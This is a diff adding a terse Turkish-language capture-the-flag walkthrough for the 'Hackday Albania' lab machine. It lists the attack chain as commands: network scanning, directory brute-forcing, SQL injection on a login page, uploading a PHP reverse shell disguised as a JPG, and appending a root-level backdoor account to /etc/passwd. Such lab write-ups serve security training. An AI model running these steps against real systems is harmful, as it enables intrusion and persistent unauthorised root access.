@@ -1,0 +1,10 @@
+HACKDAY ALBANIA MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.37 bulundu.
+2 - nmap -sT -A 192.168.2.37
+3 - gobuster dir -u http://192.168.2.37:8008/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - http://192.168.2.37:8008/unisxcudkqjydw/vulnbank/client/login.php -> SQL INJECTION
+5 - cp /usr/share/webshells/php/php-reverse-shell.php .
+6 - cp php-reverse-shell.php php-jpg-shell.jpg
+7 - openssl passwd -1 -salt testroot test -> $1$testroot$zsmCr4p6slGn7LONqkVqP1
+8 - echo 'testroot:$1$testroot$zsmCr4p6slGn7LONqkVqP1:0:0:root:/root/bin/bash' >> /etc/passwd
+9 - su testroot
